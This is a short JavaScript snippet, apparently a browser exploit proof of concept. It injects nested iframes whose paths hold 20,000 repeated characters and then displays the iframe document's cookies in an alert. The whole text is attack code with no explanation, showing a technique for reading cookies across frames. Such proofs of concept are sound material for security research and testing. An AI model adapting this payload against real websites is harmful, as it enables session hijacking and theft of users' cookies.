const iframe = document.querySelector('.asd');

const childDocument = iframe.contentWindow.document;
const nestedIframe = document.createElement('iframe');
nestedIframe.src = "/"+"A".repeat(20000);
childDocument.body.appendChild(nestedIframe);

iframe.addEventListener('load', () => {
  
  const childDocument = iframe.contentWindow.document;
  const nestedIframe = document.createElement('iframe');
  nestedIframe.src = "/"+"A".repeat(20000);
  childDocument.body.appendChild(nestedIframe);
  
  const iframeWindow = iframe.contentWindow;
  iframeWindow.alert(iframe.contentWindow.document.cookie);		
});
